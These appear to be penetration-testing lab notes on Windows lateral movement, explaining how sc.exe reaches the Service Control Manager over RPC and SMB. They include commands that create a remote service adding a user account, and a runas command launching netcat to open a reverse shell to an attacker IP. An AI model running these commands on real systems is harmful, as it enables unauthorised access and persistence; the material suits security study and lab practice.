#sc #runas
# Sc
-   **Ports:**
    -   135/TCP, 49152-65535/TCP (DCE/RPC)
    -   445/TCP (RPC over SMB Named Pipes)
    -   139/TCP (RPC over SMB Named Pipes)
-  Group: Administrators
Windows services can also be leveraged to run arbitrary commands since they execute a command when started. While a service executable is technically different from a regular application, if we configure a Windows service to run any application, it will still execute it and fail afterwards.

We can create a service on a remote host with sc.exe, a standard tool available in Windows. When using sc, it will try to connect to the Service Control Manager (SVCCTL) remote service program through RPC in several ways:

1.  A connection attempt will be made using DCE/RPC. The client will first connect to the Endpoint Mapper (EPM) at port 135, which serves as a catalogue of available RPC endpoints and request information on the SVCCTL service program. The EPM will then respond with the IP and port to connect to SVCCTL, which is usually a dynamic port in the range of 49152-65535.
```mermaid
sequenceDiagram
	participant Client as Client
	participant EPM as End Point Mapper (PORT 135)
	Client->>EPM: Where is SVCCTL?
	EPM->>Client: SVCCTL is at port 40345
```

```mermaid
sequenceDiagram
	participant Client as Client
	participant svc as SVCCTL (PORT 40345)
	Client->>svc: rpcbind to SVCCTL
```
2. If the above process fails, sc with reach SVCCTL via SMB named pipes on port 445 (SMB) or port 135 (SMB over NETBIOS)
```mermaid
sequenceDiagram
	participant Client
	participant SMB
	Client->>SMB: Bind to known pipe \pipe\svcctl [IPC$]
```
```powershell
# Create a service
sc.exe \\<server> create MyService binpath= "net user drdragon Banana79 /add" start= auto

# start the service
sc.exe \\<server> start MyService

# Stop the service
sc.exe \\<server> stop MyService

# Delete the Service
sc.exe \\<server> delete MyService
```
- the `sc.exe` command should be run with `runas.exe /netonly` so that the service is created with the admin's credentials.
```powershell
# Get a reverse shell with leonards's access token.
runas /netonly /user:ZA\admin_leonard.summers "c:\tools\nc64.exe -e cmd.exe <myIP> 4443"

# Can catch with 
nc -nvlp 4443
# now we can schedule tasks with admin's privs
```

